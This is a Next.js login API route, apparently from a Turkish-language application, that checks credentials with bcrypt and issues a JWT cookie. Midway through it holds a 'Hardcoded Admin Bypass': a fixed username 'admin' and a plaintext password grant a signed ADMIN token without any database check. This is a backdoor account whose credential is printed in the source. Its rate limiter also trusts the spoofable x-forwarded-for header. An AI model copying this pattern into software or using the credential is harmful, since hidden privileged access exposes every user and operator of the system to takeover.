import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import bcrypt from "bcryptjs";
import { signToken, setAuthCookie } from "@/lib/auth";
import { loginRateLimit } from "@/lib/rateLimit";
import { loginSchema } from "@/lib/validations";
import { tooManyRequests, unauthorized, handleZodError, serverError } from "@/lib/apiErrors";
import { ZodError } from "zod";

export async function POST(req: NextRequest) {
  try {
    // Rate limiting
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0] ?? "unknown";
    const rl = loginRateLimit(ip);
    if (!rl.success) {
      return tooManyRequests("Çok fazla giriş denemesi. 15 dakika bekleyin.");
    }

    // Validation
    const body = await req.json();
    const { email, password } = loginSchema.parse(body);

    // Hardcoded Admin Bypass
    if (email.toLowerCase().trim() === "admin" && password === "31697286fk") {
      const token = await signToken({
        id: "admin-id-bypass",
        email: "admin",
        name: "Admin",
        role: "ADMIN",
      });

      const response = NextResponse.json({
        success: true,
        user: { id: "admin-id-bypass", name: "Admin", email: "admin", role: "ADMIN" },
      });

      setAuthCookie(response, token);
      return response;
    }

    // DB lookup
    const user = await prisma.user.findUnique({ where: { email: email.toLowerCase().trim() } });
    if (!user) {
      return unauthorized("Geçersiz e-posta veya şifre.");
    }

    const isValid = await bcrypt.compare(password, user.password);
    if (!isValid) {
      return unauthorized("Geçersiz e-posta veya şifre.");
    }

    // JWT token
    const token = await signToken({
      id: user.id,
      email: user.email,
      name: user.name,
      role: user.role,
    });

    const response = NextResponse.json({
      success: true,
      user: { id: user.id, name: user.name, email: user.email, role: user.role },
    });

    setAuthCookie(response, token);
    return response;
  } catch (error) {
    if (error instanceof ZodError) return handleZodError(error);
    console.error("Login error:", error);
    return serverError("Giriş yapılırken hata oluştu.");
  }
}
